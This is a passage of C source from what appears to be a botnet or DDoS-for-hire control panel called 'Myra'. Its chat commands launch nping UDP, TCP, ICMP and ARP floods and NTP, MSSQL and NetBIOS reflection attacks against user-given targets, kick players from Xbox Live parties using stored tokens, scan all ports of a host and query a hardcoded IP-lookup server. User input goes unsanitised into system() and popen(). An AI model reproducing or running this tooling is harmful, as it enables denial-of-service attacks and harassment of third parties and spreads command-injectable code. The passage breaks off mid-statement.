      char *token = strtok(myra_buffer_size, " ");
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);
      trim_removev2(iptarget);
      FILE *fp;
      char *ip[5000];
      char path[5000];
      /* Open the command for reading. */
      sprintf(ip, "timeout 60 nping --udp -p %s -c 1000", iptarget);
      fp = popen(ip, "r");
      if (fp == NULL)
      {
        printf("Failed to run command\n");
        exit(1);
      }
      /* Read the output a line at a time - output it. */
      while (fgets(path, sizeof(path), fp) != NULL)
      {
        char puta[5000];
        sprintf(puta, "\r \e[38;5;225m%s", path);
        if (send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1)
          return;
      }
      /* close */
      pclose(fp);
      sprintf(myra, "\r \e[38;5;134mSubstrate has closed your ping successfully !\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".arp-ping") || strstr(myra_buffer_size, ".ARP-PING"))
    {
      char iptarget[5000];
      char *token = strtok(myra_buffer_size, " ");
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);
      trim_removev2(iptarget);
      FILE *fp;
      char *ip[5000];
      char path[5000];
      /* Open the command for reading. */
      sprintf(ip, "timeout 60 nping --arp %s -c 1000", iptarget);
      fp = popen(ip, "r");
      if (fp == NULL)
      {
        printf("Failed to run command\n");
        exit(1);
      }
      /* Read the output a line at a time - output it. */
      while (fgets(path, sizeof(path), fp) != NULL)
      {
        char puta[5000];
        sprintf(puta, "\r \e[38;5;225m%s", path);
        if (send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1)
          return;
      }
      /* close */
      pclose(fp);
      sprintf(myra, "\r \e[38;5;134mSubstrate has closed your ping successfully !\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".icmp-ping") || strstr(myra_buffer_size, ".ICMP-PING"))
    {
      char iptarget[5000];
      char *token = strtok(myra_buffer_size, " ");
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);
      trim_removev2(iptarget);
      FILE *fp;
      char *ip[5000];
      char path[5000];
      /* Open the command for reading. */
      sprintf(ip, "timeout 60 nping --icmp %s -c 1000", iptarget);
      fp = popen(ip, "r");
      if (fp == NULL)
      {
        printf("Failed to run command\n");
        exit(1);
      }
      /* Read the output a line at a time - output it. */
      while (fgets(path, sizeof(path), fp) != NULL)
      {
        char puta[5000];
        sprintf(puta, "\r \e[38;5;225m%s", path);
        if (send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1)
          return;
      }
      /* close */
      pclose(fp);
      sprintf(myra, "\r \e[38;5;134mSubstrate has closed your ping successfully !\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }

    /* Myra's Xbox Live Kick Function II. */

    if (strstr(myra_buffer_size, ".xbox-token") || strstr(myra_buffer_size, ".XBOX-TOKEN"))
    {
      char iptarget[5000];
      char *token = strtok(myra_buffer_size, " ");
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);
      trim_removev2(iptarget);
      char xboxtokencommand[3000];
      char xboxtokenverification[158];
      sprintf(xboxtokencommand, "echo -ne '%s'>xbox-users/\"%s\"/tokendata.txt", iptarget, accounts[find_line].username);
      system(xboxtokencommand);
      sprintf(xboxtokenverification, "\e[38;5;134mYour \e[38;5;168mXbox\e[38;5;225m-\e[38;5;168mLive \e[38;5;134mauthorization token has been refreshed \e[38;5;225msuccessfully \e[38;5;168m!\r\n");
      if (send(clear_myra_broadcast, xboxtokenverification, strlen(xboxtokenverification), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".xbox-gamertag") || strstr(myra_buffer_size, ".XBOX-GAMERTAG"))
    {
      char iptarget[5000];
      char *token = strtok(myra_buffer_size, " ");
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);
      trim_removev2(iptarget);
      char xboxtokencommand[850];
      char xboxtokenverification[158];
      sprintf(xboxtokencommand, "echo -ne '%s'>xbox-users/\"%s\"/gamertag.txt", iptarget, accounts[find_line].username);
      system(xboxtokencommand);
      sprintf(xboxtokenverification, "\e[38;5;134mYour \e[38;5;168mXbox\e[38;5;225m-\e[38;5;168mLive \e[38;5;134mgamertag has been refreshed \e[38;5;225msuccessfully \e[38;5;168m!\r\n");
      if (send(clear_myra_broadcast, xboxtokenverification, strlen(xboxtokenverification), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".xbox-party") || strstr(myra_buffer_size, ".XBOX-PARTY"))
    {
      FILE *fp;
      char *ip[5000];
      char path[5000];
      /* Open the command for reading. */
      sprintf(ip, "python3 xbox-users/%s/party.py", accounts[find_line].username);
      fp = popen(ip, "r");
      if (fp == NULL)
      {
        printf("Failed to run command\n");
        exit(1);
      }
      /* Read the output a line at a time - output it. */
      while (fgets(path, sizeof(path), fp) != NULL)
      {
        char puta[300];
        sprintf(puta, "\e[38;5;225m%s\r", path);
        if (send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1)
          return;
      }
      /* close */
      pclose(fp);
      sprintf(myra, "\e[38;5;134mMyra has \e[38;5;225mdecrypted \e[38;5;134myour \e[38;5;168mXbox\e[38;5;225m-\e[38;5;168mLive \e[38;5;134mparty \e[38;5;168m!\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".open-party") || strstr(myra_buffer_size, ".OPEN-PARTY"))
    {
      char xboxtokencommand[850];
      char xboxtokenverification[158];
      sprintf(xboxtokencommand, "python3 xbox-users/%s/open.py", accounts[find_line].username);
      system(xboxtokencommand);
      sprintf(xboxtokenverification, "\e[38;5;134mYour \e[38;5;168mXbox\e[38;5;225m-\e[38;5;168mLive \e[38;5;134mparty is now \e[38;5;225mjoinable \e[38;5;168m!\r\n");
      if (send(clear_myra_broadcast, xboxtokenverification, strlen(xboxtokenverification), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".close-party") || strstr(myra_buffer_size, ".CLOSE-PARTY"))
    {
      char xboxtokencommand[850];
      char xboxtokenverification[158];
      sprintf(xboxtokencommand, "python3 xbox-users/%s/close.py", accounts[find_line].username);
      system(xboxtokencommand);
      sprintf(xboxtokenverification, "\e[38;5;134mYour \e[38;5;168mXbox\e[38;5;225m-\e[38;5;168mLive \e[38;5;134mparty is now \e[38;5;225minvite only \e[38;5;168m!\r\n");
      if (send(clear_myra_broadcast, xboxtokenverification, strlen(xboxtokenverification), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".xbox-kick") || strstr(myra_buffer_size, ".XBOX-KICK"))
    {
      char iptarget[5000];
      char *token = strtok(myra_buffer_size, " ");
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);
      trim_removev2(iptarget);
      FILE *fp;
      char ip[10000];
      char path[5000];

      char xbox_token[4096];
      char token_file[4096];
      strcpy(token_file, "xbox-users/");
      strcat(token_file, accounts[find_line].username);
      strcat(token_file, "/tokendata.txt");
      read_file_contents(token_file, xbox_token);

      char gamertag[15];
      char gt_file[PATH_MAX];
      strcpy(gt_file, "xbox-users/");
      strcat(gt_file, accounts[find_line].username);
      strcat(gt_file, "/gamertag.txt");
      read_file_contents(gt_file, gamertag);

      /* Open the command for reading. */
      sprintf(ip, "xbox-users/xkick -u \"%s\" -g \"%s\" -t \"%s\"", gamertag, iptarget, xbox_token);
      fp = popen(ip, "r");
      if (fp == NULL)
      {
        printf("Failed to run command\n");
        exit(1);
      }
      /* Read the output a line at a time - output it. */
      while (fgets(path, sizeof(path), fp) != NULL)
      {
        char puta[300];
        sprintf(puta, "\e[38;5;225m%s\r", path);
        if (send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1)
          return;
      }
      /* close */
      pclose(fp);
    }

    /* End of Myra's Xbox Live Kick Function */

    if (strstr(myra_buffer_size, ".tcpadv-ping") || strstr(myra_buffer_size, ".TCPADV-PING"))
    {
      char iptarget[5000];
      char *token = strtok(myra_buffer_size, " ");
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);
      trim_removev2(iptarget);
      FILE *fp;
      char *ip[5000];
      char path[5000];
      /* Open the command for reading. */
      sprintf(ip, "timeout 60 nping --tcp -dddd -p %s -c 1000", iptarget);
      fp = popen(ip, "r");
      if (fp == NULL)
      {
        printf("Failed to run command\n");
        exit(1);
      }
      /* Read the output a line at a time - output it. */
      while (fgets(path, sizeof(path), fp) != NULL)
      {
        char puta[5000];
        sprintf(puta, "\r \e[38;5;225m%s", path);
        if (send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1)
          return;
      }
      /* close */
      pclose(fp);
      sprintf(myra, "\r \e[38;5;134mSubstrate has closed your ping successfully !\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".udpadv-ping") || strstr(myra_buffer_size, ".UDPADV-PING"))
    {
      char iptarget[5000];
      char *token = strtok(myra_buffer_size, " ");
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);
      trim_removev2(iptarget);
      FILE *fp;
      char *ip[5000];
      char path[5000];
      /* Open the command for reading. */
      sprintf(ip, "timeout 60 nping --udp -dddd -p %s -c 1000", iptarget);
      fp = popen(ip, "r");
      if (fp == NULL)
      {
        printf("Failed to run command\n");
        exit(1);
      }
      /* Read the output a line at a time - output it. */
      while (fgets(path, sizeof(path), fp) != NULL)
      {
        char puta[5000];
        sprintf(puta, "\r \e[38;5;225m%s", path);
        if (send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1)
          return;
      }
      /* close */
      pclose(fp);
      sprintf(myra, "\r \e[38;5;134mSubstrate has closed your ping successfully !\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".arpadv-ping") || strstr(myra_buffer_size, ".ARPADV-PING"))
    {
      char iptarget[5000];
      char *token = strtok(myra_buffer_size, " ");
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);
      trim_removev2(iptarget);
      FILE *fp;
      char *ip[5000];
      char path[5000];
      /* Open the command for reading. */
      sprintf(ip, "timeout 60 nping -dddd --arp %s -c 1000", iptarget);
      fp = popen(ip, "r");
      if (fp == NULL)
      {
        printf("Failed to run command\n");
        exit(1);
      }
      /* Read the output a line at a time - output it. */
      while (fgets(path, sizeof(path), fp) != NULL)
      {
        char puta[5000];
        sprintf(puta, "\r \e[38;5;225m%s", path);
        if (send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1)
          return;
      }
      /* close */
      pclose(fp);
      sprintf(myra, "\r \e[38;5;134mSubstrate has closed your ping successfully !\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".icmpadv-ping") || strstr(myra_buffer_size, ".ICMPADV-PING"))
    {
      char iptarget[5000];
      char *token = strtok(myra_buffer_size, " ");
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1);
      trim_removev2(iptarget);
      FILE *fp;
      char *ip[5000];
      char path[5000];
      /* Open the command for reading. */
      sprintf(ip, "timeout 60 nping -dddd --icmp %s -c 1000", iptarget);
      fp = popen(ip, "r");
      if (fp == NULL)
      {
        printf("Failed to run command\n");
        exit(1);
      }
      /* Read the output a line at a time - output it. */
      while (fgets(path, sizeof(path), fp) != NULL)
      {
        char puta[5000];
        sprintf(puta, "\r \e[38;5;225m%s", path);
        if (send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1)
          return;
      }
      /* close */
      pclose(fp);
      sprintf(myra, "\r \e[38;5;134mSubstrate has closed your ping successfully !\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".test") || strstr(myra_buffer_size, ".TEST")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      sprintf(ipkill, "./amp/methods/layer4/v1/custom/pmp-pmp/pmp-pmp %s amp/methods/layer4/v1/custom/pmp-pmp/pmp.txt 2 500;", iptarget);
      sprintf(ipkill, "./amp/methods/layer4/v1/reflection/mssql/mssql %s amp/methods/layer4/v1/reflection/mssql/mssql.txt 2 -1 500;", iptarget);
      sprintf(ipkill, "./amp/methods/layer4/v1/reflection/netbios/netbios %s amp/methods/layer4/v1/reflection/netbios/netbios.txt 2 -1 60;", iptarget);
      sprintf(ipkill, "./amp/methods/layer4/v1/reflection/ntp/ntp %s amp/methods/layer4/v1/reflection/ntp/ntp.txt 2 -1 500", iptarget);
      system(ipkill); // System Execution
      sprintf(myra, "     \e[38;5;225m╔══════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mAttack Sent!        \e[38;5;225m ║      ╔════════════════════════════╗\r\n     \e[38;5;225m║ \e[38;5;168mMethod: ZCH-CRI    \e[38;5;225m ╠══════╣ \e[38;5;168m. STOP to stop the attack! \e[38;5;225m║\r\n     \e[38;5;225m║ \e[38;5;168mUsage: SPECIAL      \e[38;5;225m ║      ╚════════════════════════════╝\r\n     \e[38;5;225m╚══════════════════════╝\r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    else if (strstr(myra_buffer_size, ".chooky") || strstr(myra_buffer_size, ".chooky")) // System Command Function -- [TESTING HERE]
    {
      char command[70];
      trim_removev2(command);
      strcpy(command, "python scripts/IPHM_Attack_Process_Killer.py");
      system(command);
      sprintf(myra, " \r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    else if (strstr(myra_buffer_size, ".nts off") || strstr(myra_buffer_size, ".tfs off") || strstr(myra_buffer_size, ".sds off") || strstr(myra_buffer_size, ".pos off") || strstr(myra_buffer_size, ".cos off") || strstr(myra_buffer_size, ".sos off") || strstr(myra_buffer_size, ".nes off") || strstr(myra_buffer_size, ".mss off") || strstr(myra_buffer_size, ".tss off")) // System Command Function -- [TESTING HERE]
    {
      char command[70];
      trim_removev2(command);
      strcpy(command, "python scripts/IPHM_Scanner_Process_Killer.py");
      system(command);
      sprintf(myra, " \r\n");
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".install") || strstr(myra_buffer_size, ".INSTALL")) // System Command Function -- [TESTING HERE]
    {
      if (strcmp(Admin, accounts[find_line].identification_type) == 0) // Check If User Is Admin
      {
        char command[50];
        trim_removev2(command);
        strcpy(command, "python install.py");
        system(command);
        sprintf(myra, "\e[38;5;134mAll IP-Header Modification Based methods downloaded!\r\n");
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(myra, "\e[38;5;134mOwners Only!!\r\n");
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          ; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
    }
    if (strstr(myra_buffer_size, ".SEARCH") || strstr(myra_buffer_size, ".search")) // Resolve Command - Function Requires 'resolve.h'
    {
      char *internet_protocol[100];                                                                                                                                       // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                                                                                                                        // Char Every Line For Output Communication
      char *url = token + sizeof(token);                                                                                                                                  // Char Every Line For Output Communication
      trim_removev2(url);                                                                                                                                                 // Trim [Url]
      resolve(url, internet_protocol);                                                                                                                                    // Using User Input - Stated As 'Url' or 'IP' - We Use This In The Resolver Function
      sprintf(myra, "\e[38;5;168mResolved \e[38;5;134m[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mto \e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]\r\n", url, internet_protocol); // Resolver Output
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".adduser") || strstr(myra_buffer_size, ".ADDUSER") || strstr(myra_buffer_size, "adduser") || strstr(myra_buffer_size, "ADDUSER")) // Add User Function, This Allows Us To Easily Add A New User To The Network, Without Having To Manually Edting The login.txt
    {
      if (strcmp(Admin, accounts[find_line].identification_type) == 0) // Check If User Is Admin
      {
        char *token = strtok(myra_buffer_size, " ");                                                                                                                                                                              // Char Every Line For Output Communication
        char *userinfo = token + sizeof(token);                                                                                                                                                                                   // Char Every Line For Output Communication
        trim_removev2(userinfo);                                                                                                                                                                                                  // Trim [Userinfo]
        char *uinfo[50];                                                                                                                                                                                                          // Char Every Line For Output Communication
        sprintf(uinfo, "echo '%s' >> myra.txt", userinfo);                                                                                                                                                                        // We Are Editing The Following File --> 'myra.txt' Which Is Our 'Login.txt'
        system(uinfo);                                                                                                                                                                                                            // Access Of System Functions In Order To Edit The File From The Communicating Screen
        printf("\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser\e[38;5;134m:[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mAdded User\e[38;5;134m:[\e[38;5;168m%s\e[38;5;134m]\n", accounts[find_line].username, userinfo); // Adding User - Output
        sprintf(myra, "\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mUser\e[38;5;134m:[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mSuccessfully Added!\r\n", userinfo);                                                      // Adding User - Output
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(myra, "Admins Only!\r\n");
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          ; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
    }
    //       else if(strstr(myra_buffer_size, ".deluser") || strstr(myra_buffer_size, ".DELUSER")
    //       {
    //           if(strcmp(Admin, accounts[find_line].identification_type) == 0)
    //           {
    //               int kdm;
    //               char deluser[50];
    //               if(send(clear_myra_broadcast, "\x1b[1;36mUsername: \x1b[37m", strlen("\x1b[1;36mUsername: \x1b[37m"), MSG_NOSIGNAL) == -1) goto finish_integer;
    //               memset(deluser, 0, sizeof(deluser));
    //               while(buffer_size_string_compare(deluser, sizeof deluser, clear_myra_broadcast) < 1)
    //               {
    //                   trim_removev2(deluser);
    //                   if(strlen(deluser) < 3) continue;
    //                   break;
    //               }
    //               trim_removev2(deluser);
    //               rmstr(deluser, ACC_FILE);
    //               sprintf(myra, "\x1b[1;36mDeleted User \x1b[0m(\x1b[1;36m%s\x1b[0m)...\r\n", deluser);
    //               if(send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1) goto finish_integer;
    //               for(kdm = 0; kdm < max_file_descriptor_value; kdm++)
    //               {
    //                   if(!managers[kdm].transmitted_successfully) continue;
    //                   if(!strcmp(managers[kdm].username, deluser))
    //                   {
    //                       close(kdm);
    //                       managers[kdm].transmitted_successfully = 0;
    //                       memset(managers[kdm].username, 0, sizeof(managers[kdm].username));
    //                   }
    //               }
    //           }
    //           else
    //           {
    //               sprintf(myra, "\x1b[31mPermission Denied, Admins Only!\x1b[37m\r\n");
    //               if(send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1) return;
    //           }
    //       }
    else if (strstr(myra_buffer_size, "PORTSCAN") || strstr(myra_buffer_size, "portscan")) // Portscan Function - Easy And Stable Port Scan [II]
    {
      int unknown_integer;                                           // We State X As The Unknown Integer [This Will Be The User Input]
      int timeout_portscan = 3;                                      // Create An Integer For The Time-Out, This Will Minimise Network Saturation
      int start_port = 1;                                            // Create An Integer For The First Port - [We Need A Start Point Of Course]
      int end_port = 65535;                                          // Create An Integer For The First Port - [We Need A End Point Of Course]
      char host[16];                                                 // Char Every Line For Output Communication
      trim_removev2(myra_buffer_size);                               // Trim [Buffer]
      char *token = strtok(myra_buffer_size, " ");                   // Char Every Line For Output Communication
      snprintf(host, sizeof(host), "%s", token + strlen(token) + 1); // Check Host, Create '+1' Token, Then Use 'Botnet'
      snprintf(myra, sizeof(myra), "\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mChecking ports \e[38;5;134m[\e[38;5;168m%d\e[38;5;134m] \e[38;5;168mthrough \e[38;5;134m[\e[38;5;168m%d\e[38;5;134m] \e[38;5;168mFor IP\e[38;5;134m:[\e[38;5;168m%s\e[38;5;134m]\x1b[0m\r\n", start_port, end_port, host);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return;                                                                         // We Will Terminate Concurrent Function And Carry on.. Use Values As Follows 'unknown_integer'
      for (unknown_integer = start_port; unknown_integer < end_port; unknown_integer++) // We Start From The Lowest Port To Biggest Port
      {
        int socket_propulsion_data = -1; // Create Integer For Socket - '-1'
        struct timeval timeout;          // We Are Creating A Timing System - This Is For Timeout, Creating Struct. For 'timeval-timeout'
        struct sockaddr_in sock;         // Struct. Creation Of socket_propulsion_data-Address
        // set timeout secs
        timeout.tv_sec = timeout_portscan;                                                              // Timeout - tv
        timeout.tv_usec = 0;                                                                            // Timeout - tv_usec
        socket_propulsion_data = socket(AF_INET, SOCK_STREAM, 0);                                       // Create Our TCP Socket Using AF_INET
        setsockopt(socket_propulsion_data, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)); // Setsockopt -- This Is Our RCV Time -- [Received]
        setsockopt(socket_propulsion_data, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout)); // Setsockopt -- This Is Our SND Time -- [Sending]
        sock.sin_family = AF_INET;                                                                      // Socket-Sin, Family -- Using AF_INET
        sock.sin_port = htons(unknown_integer);                                                         // Using 'htons' Set As The 'unknown_integer' Value
        sock.sin_addr.s_addr = inet_addr(host);                                                         // State The 'inet' As The Host, Suffix Has Been Created, So Process Is Independent
        if (connect(socket_propulsion_data, (struct sockaddr *)&sock, sizeof(sock)) == -1)
          close(socket_propulsion_data); // If The Packet Returned, It Will Not Be Displayed
        else
        { // If The Packet Returns From Handshake, The Port Is Open
          snprintf(myra, sizeof(myra), "\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mPort\e[38;5;134m:[\e[38;5;168m%d\e[38;5;134m] \e[38;5;168mis open For IP\e[38;5;134m:[\e[38;5;168m%s\e[38;5;134m]\x1b[0m\r\n", unknown_integer, host);
          if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
            return;                      // Each Line Set on [MSG_NOSIGNAL] - Broadcast
          memset(myra, 0, sizeof(myra)); // Fill In Data Block, Let's Keep Our Communication Stable
          close(socket_propulsion_data); // Kill Our Open Socket - TCP
        }
      } // Scan Is Done -- Output
      snprintf(myra, sizeof(myra), "\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mScan on IP\e[38;5;134m:[\e[38;5;168m%s\e[38;5;134m] \e[38;5;168mis Done!\x1b[0m\r\n", host);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    else if (strstr(myra_buffer_size, "lelokman") || strstr(myra_buffer_size, "lelokman"))
    {
      char myhost[20];                                                   // Char Every Line For Output Communication
      char ki11[1024];                                                   // Char Every Line For Output Communication // Ip Lookup Function
      snprintf(ki11, sizeof(ki11), "%s", myra_buffer_size);              // Using Kill Prefix For Dynamic Integer
      trim_removev2(ki11);                                               // Trim [ki11]
      char *token = strtok(ki11, " ");                                   // Char Every Line For Output Communication
      snprintf(myhost, sizeof(myhost), "%s", token + strlen(token) + 1); // Host Size Statement, This Is For OCMIS [PSL-0012]
      if (atoi(myhost) >= 8)                                             // Bigger Than Int Value Of 8
      {
        int IPL_DATA;                                                                // Create Integer For 'IPL_DATA' -- Used In Each Value, For Time-Out Sequence
        int ipl_integer_size = -1;                                                   // State IPLSOCK == -1 [Shouldn't Class With The Open Socket Via TCP]
        char buffer_IPL[1024];                                                       // Char Every Line For Output Communication
        int source_port = 80;                                                        // Set Default Connection Port As [62141]
        char ip_lookup_headers[1024];                                                // Char Every Line For Output Communication
        struct timeval timeout;                                                      // Create Struct. For Time Interval Timeout
        struct sockaddr_in sock;                                                     // Create Another Struct. For Socket-Address -> Socket
        char *iplookup_host = "91.134.3.214";                                        // Change to Server IP - [EDIT HERE]
        timeout.tv_sec = 4;                                                          // 4 second timeout
        timeout.tv_usec = 0;                                                         // 0 second -- Run Function
        ipl_integer_size = socket(AF_INET, SOCK_STREAM, 0);                          // Running Socketstream, Using Set Values - We Are Concurrent
        sock.sin_family = AF_INET;                                                   // Socket Sin == Sin.family, Engages Better With Output Connection
        sock.sin_port = htons(source_port);                                          // htons, Is Dependent On The Connection Port -- Integer States Are Constant
        sock.sin_addr.s_addr = inet_addr(iplookup_host);                             // Coherent Connection - Will Kill Socket If Lookup Is Incomplete
        if (connect(ipl_integer_size, (struct sockaddr *)&sock, sizeof(sock)) == -1) // Check Using ipl_integer_size, If Connection Has Been Reached
        {
          //printf("[\x1b[31m-\x1b[37m] Failed to connect to iplookup host server...\n");
          sprintf(myra, "\x1b[31m[IPLookup] Failed to connect to iplookup server...\x1b[0m\r\n", myhost);
          if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
            return;
        }
        else // Else...
        {
          //printf("[\x1b[32m+\x1b[37m] Connected to iplookup server :)\n");                This Below, Is Our Header Sent To The API, This Shouldn't Cause Problems..
          snprintf(ip_lookup_headers, sizeof(ip_lookup_headers), "GET /iplookup.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\r\n\r\n", myhost, iplookup_host);
          if (send(ipl_integer_size, ip_lookup_headers, strlen(ip_lookup_headers), 0))
          {
            //printf("[\x1b[32m+\x1b[37m] Sent request headers to iplookup api!\n");
            sprintf(myra, "\e[38;5;134m[\e[38;5;168mMyra\e[38;5;134m] \e[38;5;168mGathering Information On IP:\e[38;5;134m[\e[38;5;168m%s\e[38;5;134m]\r\n", myhost); // IP Info -- Output
            if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
              return;
            char ch;                            // Char Every Line For Output Communication
            int retrv = 0;                      // Create Integer For 'Retrv' -- [OPEN INT == 0]
            uint32_t header_parser = 0;         // Let's Create A Header Parse, Under 32-bit Unsigned Integer, This Allows Accurate Value Statement
            while (header_parser != 0x0D0A0D0A) // Set Header Parse Value = '0x0D0A0D0A'
            {
              if ((retrv = read(ipl_integer_size, &ch, 1)) != 1) // Check For Success, Using IPL socket_propulsion_data
                break;

              header_parser = (header_parser << 8) | ch; // Change Parser Value, Below '8'
            }
            memset(buffer_IPL, 0, sizeof(buffer_IPL));                  // Fill Data Block, Stabilises On-going Process, Using Socket-Buffer
            while (IPL_DATA = read(ipl_integer_size, buffer_IPL, 1024)) // Set Ret, To Read -- Buffer Size Stated Coherently, [1024]
            {
              buffer_IPL[IPL_DATA] = '\0'; // Break, Below Is An Alternative If A Second Function Is Added
                                           /*if(strlen(buffer_IPL) > 1)
                                printf("\x1b[36m%s\x1b[37m\n", buffer);*/
            }
            //printf("%s\n", buffer_IPL); <---- This Would Be Used, If No Error Handling Is Needed. The User Will Not Be Informed With DETAILS
            if (strstr(buffer_IPL, "<title>404")) // Use Header Title + Error 404 [Assumption Error = 404]
            {
              char iplookup_host_token[20];                                                                                    // Char Every Line For Output Communication
              sprintf(iplookup_host_token, "%s", iplookup_host);                                                               // %s Is Our Host Token, Set This As Our DISPLAY Variable
              int ip_prefix = atoi(strtok(iplookup_host_token, "."));                                                          // Create Integer For The IP Prefix, This Is Defined Using Our Received host_token
              sprintf(myra, "\x1b[31m[IPLookup] Failed, API can't be located on server %d.*.*.*:62141\x1b[0m\r\n", ip_prefix); // Error Handling -- No API Was Found, Defined By Host Token
              memset(iplookup_host_token, 0, sizeof(iplookup_host_token));                                                     // Fill Data Block Again, We Do This For Every Function, To Stop Instability and Saturation
            }
            else if (strstr(buffer_IPL, "nickers"))                                                                                 // Hehe.. ( ͡° ͜ʖ ͡°)
              sprintf(myra, "\x1b[31m[IPLookup] Failed, Hosting server needs to have php installed for api to work...\x1b[0m\r\n"); // Error Handling, Hosting Has No PHP..
            else
